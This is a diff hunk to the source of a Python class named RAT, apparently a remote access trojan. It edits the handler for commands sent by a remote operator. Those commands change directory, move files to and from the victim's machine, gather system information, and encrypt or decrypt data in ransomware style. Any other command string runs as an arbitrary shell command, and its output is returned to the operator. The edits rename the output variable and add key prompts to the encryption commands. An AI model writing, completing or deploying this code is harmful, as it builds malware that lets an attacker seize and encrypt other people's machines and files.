@@ -226,42 +226,46 @@ class RAT:
 		elif(data.startswith('cd ')):
 			try:	
 				os.chdir(data[3:])
-				stdoutput = ""
+				std = ""
 			except OSError as e:
 				# No such directory
 				if(e[0] is 2):
-					stdoutput = str(e)
+					std = str(e)
 					pass
 				# Other errors
 				else:
-					stdoutput = str(e)
+					std = str(e)
 					pass
 		# check for download
 		elif(data.startswith('download ')):
-			stdoutput = upload(data[9:])
+			std = upload(data[9:])
 		# check for upload
 		elif(data.startswith('upload ')):
-			stdoutput = download(data[7:])
+			std = download(data[7:])
 		# send system info
 		elif(data.startswith('sys_info')):
-			stdoutput = cls.drill_down()
+			std = cls.drill_down()
 		# encrypt all data
 		elif(data.startswith('encrypt_all')):
-			cls._raw.handler(data, "")
+			key = raw_input("Enter Key: ")
+			std = cls._raw.handler(data, key)
 		# encrypt data 
 		elif(data.startswith('encrypt')):
-			cls._raw.handler(data, "")
+			key = raw_input("Enter Key: ")
+			std = cls._raw.handler(data, key)
 		# decrypt all data
 		elif(data.startswith('decrypt_all')):
-			cls._raw.handler(data, "")
+			key = raw_input("Enter Key: ")
+			std = cls._raw.handler(data, key)
 		# decrypt data 
 		elif(data.startswith('decrypt')):
-			cls._raw.handler(data, "")
+			key = raw_input("Enter Key: ")
+			std = cls._raw.handler(data, key)
 		# bind a shell subprocess  
 		else:
 			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			stdoutput = proc.stdout.read() + proc.stderr.read()
-		return stdoutput
+			std = proc.stdout.read() + proc.stderr.read()
+		return std
 
 
 	# socket error handler
